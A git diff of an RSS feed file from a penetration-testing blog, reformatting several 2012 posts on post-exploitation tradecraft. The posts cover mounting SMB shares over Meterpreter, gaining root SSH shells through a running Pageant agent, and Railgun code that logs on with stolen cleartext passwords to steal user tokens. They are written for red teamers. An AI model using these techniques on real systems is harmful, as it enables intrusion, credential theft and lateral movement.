+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;One thing I have yet to update is a simple check to make sure you are an admin that can actually bypass UAC. If you aren&#39;t, then you&#39;ll be leaving this lovely calling card behind for the user:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_7.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 </description>
     </item>
     
@@ -275,43 +174,24 @@ mimikatz # sekurlsa::logonPasswords full
       
       <guid>https://malicious.link/post/2012/2012-10-17-mounting-smb-shares-over-meterpreter/</guid>
       <description>&lt;p&gt;Ok, this is pretty straight forward no magic:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Got a shell, doesn&amp;rsquo;t have to be SYSTEM&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Got a shell, doesn&#39;t have to be SYSTEM&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Add a route to the internal range or directly to the host you want over the session you want&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Mosy on over  to the Socks4a module. And in another terminal we need to make sure our proxychains.conf file in /etc/ or where ever you store your conf is correct. &lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;It defaults to 9050 on 127.0.01 for Tor, that&amp;rsquo;s pretty easy to cope with and no reason to mess with it if you actually use it for Tor for other things.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;It defaults to 9050 on 127.0.01 for Tor, that&#39;s pretty easy to cope with and no reason to mess with it if you actually use it for Tor for other things.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Run the socks proxy with the Tor-like settings. (Remember to shutdown Tor first)&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;And the rest is gravy. The % (percent sign if blog software mangles it) is a delimiter that smbclient and other samba tools recognize between user and password (so it doesn&amp;rsquo;t prompt you for it).&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And the rest is gravy. The % (percent sign if blog software mangles it) is a delimiter that smbclient and other samba tools recognize between user and password (so it doesn&#39;t prompt you for it).&lt;/p&gt;
 &lt;p&gt;And just to love it working:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;yay files.. Yes I know I didn&amp;rsquo;t use smbmount but it works the same as well as rpcclient.&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_7.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;yay files.. Yes I know I didn&#39;t use smbmount but it works the same as well as rpcclient.&lt;/p&gt;
 &lt;p&gt;A side note here is if you are using the pth-tools from:&lt;/p&gt;
-
 &lt;p&gt;&lt;a href=&#34;https://code.google.com/p/passing-the-hash/&#34;&gt;https://code.google.com/p/passing-the-hash/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;You can use hashes instead of passwords for stuff like this. But who are we kidding? Who doesn&amp;rsquo;t get clear text passwords anymore ;-)&lt;/p&gt;
-
+&lt;p&gt;You can use hashes instead of passwords for stuff like this. But who are we kidding? Who doesn&#39;t get clear text passwords anymore ;-)&lt;/p&gt;
 &lt;p&gt; &lt;/p&gt;
 </description>
     </item>
@@ -323,7 +203,6 @@ mimikatz # sekurlsa::logonPasswords full
       
       <guid>https://malicious.link/post/2012/2012-08-28-free-shells-with-plink-and-pageant/</guid>
       <description>&lt;p&gt;Watching &lt;a href=&#34;http://twitter.com/egyp7&#34;&gt;Egypt&lt;/a&gt;’s talk at DEFCON 20 he mentioned the ability to jump on on a system when pageant (puTTY’s ssh-agent equivalent) is running. So I wanted to figure out the best way to get this going. Here is what I came up with:&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; run enum_putty
 [*] Putty Installed for [[&amp;quot;Administrator&amp;quot;]]
 [*] Saved SSH Server Public Keys:
@@ -334,10 +213,7 @@ mimikatz # sekurlsa::logonPasswords full
 [*]     Username: root
 [*]     Public Key:
 meterpreter &amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Awesome, this guy runs as root and we have the IP address. But it doesn’t have any public keys listed. That’s ok because Pageant is running.&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Awesome, this guy runs as root and we have the IP address. But it doesn’t have any public keys listed. That’s ok because Pageant is running.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; shell
 Process 3364 created.
 Channel 1 created.
@@ -351,11 +227,8 @@ No mail.
 Last login: Tue Aug 28 14:15:18 2012 from 172.16.10.100
 root@172.16.10.150:~]$ id
 uid=0(root) gid=0(root) groups=0(root)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;w00t! An extra shell for free!!&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201208_freeshells_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;w00t! An extra shell for free!!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201208_freeshells_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 </description>
     </item>
     
@@ -365,38 +238,22 @@ uid=0(root) gid=0(root) groups=0(root)
       <pubDate>Tue, 31 Jul 2012 20:20:15 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/</guid>
-      <description>&lt;p&gt;With the use of Mimikatz and WCE, clear text passwords are much more common. What isn&amp;rsquo;t always there is the user. They take lunches, go home at a reasonable time and generally aren&amp;rsquo;t really appreciative of our (pentester/red teamer)&amp;rsquo;s schedule.&lt;/p&gt;
-
+      <description>&lt;p&gt;With the use of Mimikatz and WCE, clear text passwords are much more common. What isn&#39;t always there is the user. They take lunches, go home at a reasonable time and generally aren&#39;t really appreciative of our (pentester/red teamer)&amp;lsquo;s schedule.&lt;/p&gt;
 &lt;p&gt;A straight forward way, and provided by Microsoft to create a process as a user (whereby having their token readily available is using &amp;lsquo;runas.exe&amp;rsquo;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;w00t, we the user is present, we can migrate our meterepreter session into that notepad and we&amp;rsquo;re good right? Problem there is you have to interactively input the password, so without a real cmd.exe or RDP session of your own, (VNC payload would work), you&amp;rsquo;re generally SOL.&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;w00t, we the user is present, we can migrate our meterepreter session into that notepad and we&#39;re good right? Problem there is you have to interactively input the password, so without a real cmd.exe or RDP session of your own, (VNC payload would work), you&#39;re generally SOL.&lt;/p&gt;
 &lt;p&gt;There are a ton of posted ways around this, most involve make a wrapper script to input the password for you such as this one:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;(this was pretty unique as it actually sent the keys to the key buffer instead of directly to STDIN)&lt;/p&gt;
-
-&lt;p&gt;Another way if you don&amp;rsquo;t mind dropping / creating a custom bin, AutoIT makes this REALLY simple:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This could be 2 lines if you really wanted it to be but I like to make things a bit more universal. You could also execute this directly in memory with meterepreter&amp;rsquo;s execute command with the &amp;ldquo;-m&amp;rdquo; argument after you&amp;rsquo;ve built the AutoIT script into a EXE.&lt;/p&gt;
-
+&lt;p&gt;Another way if you don&#39;t mind dropping / creating a custom bin, AutoIT makes this REALLY simple:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This could be 2 lines if you really wanted it to be but I like to make things a bit more universal. You could also execute this directly in memory with meterepreter&#39;s execute command with the &amp;ldquo;-m&amp;rdquo; argument after you&#39;ve built the AutoIT script into a EXE.&lt;/p&gt;
 &lt;p&gt;But what go through all that trouble? Railgun can do this just as easily. Drop to IRB or create a script that does the following:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;a = client.railgun.kernel32.GetStartupInfoW(56)[&amp;quot;lpStartupInfo&amp;quot;]
-client.railgun.advapi32.CreateProcessWithLogonW(&amp;quot;USER&amp;quot;,&amp;quot;DOMAIN&amp;quot;,&amp;quot;PASSWORD&amp;quot;,&amp;quot;LOGON_WITH_PROFILE&amp;quot;,&amp;quot;notepad.exe&amp;quot;,nil,0,nil,nil,a,32)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This will create a notepad.exe process with the defined user. But we can go a bit more stealthy, since we really only need their account token we can just user LogonUser:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.railgun.advapi32.LogonUserA(&amp;quot;USER&amp;quot;,&amp;quot;DOMAIN&amp;quot;,&amp;quot;PASSWORD&amp;quot;,&amp;quot;LOGON32_LOGON_INTERACTIVE&amp;quot;,&amp;quot;LOGON32_PROVIDER_DEFAULT&amp;quot;,4)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;List the tokens available with Incognito, your new user will be there, steal it and you&amp;rsquo;re done. You now have the ability to user that account/domain token on any of the hosts you&amp;rsquo;ve compromised on the network, not just the ones they happen to have left themselves logged in. This gets really fun on servers where the admin hasn&amp;rsquo;t logged in but you wanna grab all of their IE saved passwords ;-)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GetStartupInfoW(&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;lpStartupInfo&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;advapi32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CreateProcessWithLogonW(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;USER&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;DOMAIN&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;PASSWORD&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;LOGON_WITH_PROFILE&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;notepad.exe&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;,a,&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will create a notepad.exe process with the defined user. But we can go a bit more stealthy, since we really only need their account token we can just user LogonUser:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;advapi32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;LogonUserA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;USER&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;DOMAIN&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;PASSWORD&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;LOGON32_LOGON_INTERACTIVE&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;LOGON32_PROVIDER_DEFAULT&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;List the tokens available with Incognito, your new user will be there, steal it and you&#39;re done. You now have the ability to user that account/domain token on any of the hosts you&#39;ve compromised on the network, not just the ones they happen to have left themselves logged in. This gets really fun on servers where the admin hasn&#39;t logged in but you wanna grab all of their IE saved passwords ;-)&lt;/p&gt;
 </description>
     </item>
     
@@ -407,88 +264,75 @@ client.railgun.advapi32.CreateProcessWithLogonW(&amp;quot;USER&amp;quot;,&amp;qu
       
       <guid>https://malicious.link/post/2012/2012-06-28-netstat-post-module-for-meterpreter/</guid>
       <description>&lt;p&gt;Submitted it to MSF via pull request here: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/538&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/538&lt;/a&gt;&lt;/p&gt;
-
 &lt;p&gt;Added to trunk: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/tcpnetstat.rb&#34;&gt;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/tcpnetstat.rb&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;I promised this one a while ago, sorry for the delay. This only does TCP, it&amp;rsquo;d be trivial to do UDP as well but never really found anything interesting and actively going on on the UDP side. It&amp;rsquo;s real simple, first we&amp;rsquo;ve gotta add the &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366026%28v=vs.85%29.aspx&#34;&gt;GetTcpTable&lt;/a&gt; function to railgun:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;session.railgun.add_function(&#39;iphlpapi&#39;, &#39;GetTcpTable&#39;, &#39;DWORD&#39;, [
-	[&#39;PBLOB&#39;, &#39;pTcpTable&#39;, &#39;out&#39;],
-	[&#39;PDWORD&#39;, &#39;pdwSize&#39;, &#39;inout&#39;],
-	[&#39;BOOL&#39;, &#39;bOrder&#39;, &#39;in&#39;]
-])
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Then gauge the size of the table:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;getsize = session.railgun.iphlpapi.GetTcpTable(4,4,true)
-buffersize = getsize[&#39;pdwSize&#39;]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Run the call again with the correct buffer size:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;tcptable = session.railgun.iphlpapi.GetTcpTable(buffersize,buffersize,true)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Then it&amp;rsquo;s all just parsing the result. Also pretty straight forward. First we get the number of entries which is held in the first 4 bytes, then just parse the &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366917%28v=vs.85%29.aspx&#34;&gt;MIB_TCPTABLE&lt;/a&gt; one &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366909%28v=vs.85%29.aspx&#34;&gt;MIB_TCPROW&lt;/a&gt; at a time (translating the state to something readable):&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;def parse_tcptable(buffer)
-	entries = buffer[0,4].unpack(&amp;quot;V*&amp;quot;)[0]
-	print_status(&amp;quot;Total TCP Entries: #{entries}&amp;quot;)
-	rtable = Rex::Ui::Text::Table.new(
-		&#39;Header&#39; =&amp;gt; &#39;Routing Table&#39;,
-		&#39;Indent&#39; =&amp;gt; 2,
-		&#39;Columns&#39; =&amp;gt; [&#39;STATE&#39;, &#39;LHOST&#39;, &#39;LPORT&#39;, &#39;RHOST&#39;, &#39;RPORT&#39;]
+&lt;p&gt;I promised this one a while ago, sorry for the delay. This only does TCP, it&#39;d be trivial to do UDP as well but never really found anything interesting and actively going on on the UDP side. It&#39;s real simple, first we&#39;ve gotta add the &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366026%28v=vs.85%29.aspx&#34;&gt;GetTcpTable&lt;/a&gt; function to railgun:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;session&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_function(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;iphlpapi&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;GetTcpTable&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DWORD&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;
+	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PBLOB&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pTcpTable&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;out&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,
+	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PDWORD&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pdwSize&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;inout&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,
+	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BOOL&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bOrder&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;in&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then gauge the size of the table:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;getsize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; session&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iphlpapi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GetTcpTable(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;)
+buffersize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getsize&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pdwSize&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Run the call again with the correct buffer size:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;tcptable &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; session&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iphlpapi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GetTcpTable(buffersize,buffersize,&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then it&#39;s all just parsing the result. Also pretty straight forward. First we get the number of entries which is held in the first 4 bytes, then just parse the &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366917%28v=vs.85%29.aspx&#34;&gt;MIB_TCPTABLE&lt;/a&gt; one &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366909%28v=vs.85%29.aspx&#34;&gt;MIB_TCPROW&lt;/a&gt; at a time (translating the state to something readable):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;parse_tcptable&lt;/span&gt;(buffer)
+	entries &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; buffer&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;V*&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+	print_status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Total TCP Entries: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;entries&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+	rtable &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Rex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Ui&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Text&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Table&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(
+		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Header&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Routing Table&amp;#39;&lt;/span&gt;,
